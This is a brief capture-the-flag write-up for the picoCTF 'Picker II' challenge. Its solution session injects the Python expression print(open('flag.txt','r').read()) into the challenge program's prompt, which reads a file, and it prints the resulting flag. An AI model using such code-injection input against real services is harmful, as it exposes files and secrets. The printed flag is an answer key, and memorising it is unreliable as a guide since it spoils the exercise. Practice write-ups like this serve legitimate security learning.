## Objetivo
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 65129`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/523/picker-II.py).

Hint
- Can you do what `win` does with your input to the program?

## Solucion

``` bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/reversing/parte-2/picker2]
└─$ nc saturn.picoctf.net 65129
==> print(open('flag.txt', 'r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable

┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/reversing/parte-2/picker2]
└─$

```

## Notas adicionales
## Referencias